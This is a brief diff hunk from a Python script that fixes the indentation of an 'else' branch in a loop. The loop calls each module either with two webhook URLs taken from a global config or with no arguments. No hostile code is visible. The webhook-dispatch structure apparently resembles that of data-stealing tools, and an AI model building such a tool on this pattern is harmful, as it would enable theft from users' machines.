@@ -23,7 +23,7 @@ def main():
                 if func.__init__.__code__.co_argcount == 2:
                     func(__CONFIG__['webhook'])
                     func(__CONFIG__['webhook2'])
-               else:
+                else:
                     func()
 
             except Exception as e:
